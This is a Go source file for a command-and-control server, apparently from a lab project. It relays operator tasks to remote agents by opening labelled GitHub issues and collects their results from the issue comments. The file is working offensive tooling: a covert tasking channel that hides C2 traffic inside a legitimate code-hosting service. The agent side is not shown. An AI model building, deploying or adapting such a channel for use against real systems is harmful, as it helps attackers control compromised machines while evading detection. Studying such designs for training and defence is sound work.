package main

import (
    "context"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "os"
    "sync"
    "time"

    "c2lab/shared"

    "github.com/google/go-github/v60/github"
    "golang.org/x/oauth2"
)

const (
    taskPollInterval = 5 * time.Second
    taskTimeout      = 5 * time.Minute
)

// Config — all from environment variables.
var (
    githubToken string
    githubOwner string
    githubRepo  string
    httpAddr    string
    taskLabel   string // label applied to new tasks — MUST be unique to you
)

// In-memory result cache (task_id -> output).
var (
    results = make(map[string]string)
    mutex   = &sync.Mutex{}
)

func loadConfig() {
    githubToken = mustEnv("GITHUB_TOKEN")
    githubOwner = mustEnv("GITHUB_OWNER")
    githubRepo  = mustEnv("GITHUB_REPO")
    httpAddr    = getEnvDefault("HTTP_ADDR", ":8080")
    taskLabel   = getEnvDefault("TASK_LABEL", "c2-task")
}

func main() {
    loadConfig()

    http.HandleFunc("/task", handleTask)
    http.HandleFunc("/result", handleResult)
    http.Handle("/", http.FileServer(http.Dir("./frontend")))

    log.Printf("controller listening on %s (task label: %s)", httpAddr, taskLabel)
    log.Fatal(http.ListenAndServe(httpAddr, nil))
}

func handleTask(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "POST only", http.StatusMethodNotAllowed)
        return
    }

    var task shared.Task
    if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
        http.Error(w, err.Error(), http.StatusBadRequest)
        return
    }
    if task.TaskID == "" || task.AgentID == "" || task.Action == "" {
        http.Error(w, "task_id, agent_id and action are required", http.StatusBadRequest)
        return
    }

    ctx := r.Context()
    client := newGitHubClient(ctx)

    body, _ := json.Marshal(task)
    issue, _, err := client.Issues.Create(ctx, githubOwner, githubRepo, &github.IssueRequest{
        Title:  github.String(fmt.Sprintf("Task %s", task.TaskID)),
        Body:   github.String(string(body)),
        Labels: &[]string{taskLabel},
    })
    if err != nil {
        http.Error(w, fmt.Sprintf("failed to create issue: %v", err), http.StatusInternalServerError)
        return
    }

    log.Printf("created issue #%d for task %s (label: %s)", issue.GetNumber(), task.TaskID, taskLabel)

    go pollForResult(issue.GetNumber(), task.TaskID)

    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusAccepted)
    json.NewEncoder(w).Encode(map[string]string{
        "status":  "submitted",
        "task_id": task.TaskID,
        "issue":   fmt.Sprintf("%d", issue.GetNumber()),
    })
}

func pollForResult(issueNumber int, taskID string) {
    ctx := context.Background()
    client := newGitHubClient(ctx)
    deadline := time.Now().Add(taskTimeout)

    for time.Now().Before(deadline) {
        time.Sleep(taskPollInterval)

        comments, _, err := client.Issues.ListComments(ctx, githubOwner, githubRepo, issueNumber, nil)
        if err != nil {
            log.Printf("poll: list comments: %v", err)
            continue
        }

        for _, c := range comments {
            var res shared.Result
            if err := json.Unmarshal([]byte(c.GetBody()), &res); err != nil {
                continue
            }
            if res.TaskID != taskID {
                continue
            }
            mutex.Lock()
            results[taskID] = res.Output
            mutex.Unlock()
            log.Printf("result received for task %s: %s", taskID, res.Output)
            return
        }
    }
    log.Printf("timed out waiting for task %s", taskID)
}

func handleResult(w http.ResponseWriter, r *http.Request) {
    taskID := r.URL.Query().Get("task_id")
    if taskID == "" {
        http.Error(w, "missing task_id", http.StatusBadRequest)
        return
    }

    mutex.Lock()
    output, ok := results[taskID]
    mutex.Unlock()

    w.Header().Set("Content-Type", "application/json")
    if !ok {
        w.WriteHeader(http.StatusNotFound)
        json.NewEncoder(w).Encode(map[string]string{"status": "pending"})
        return
    }
    json.NewEncoder(w).Encode(map[string]string{"task_id": taskID, "output": output})
}

func newGitHubClient(ctx context.Context) *github.Client {
    ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: githubToken})
    tc := oauth2.NewClient(ctx, ts)
    return github.NewClient(tc)
}

func mustEnv(key string) string {
    v := os.Getenv(key)
    if v == "" {
        log.Fatalf("missing required environment variable: %s", key)
    }
    return v
}

func getEnvDefault(key, def string) string {
    if v := os.Getenv(key); v != "" {
        return v
    }
    return def
}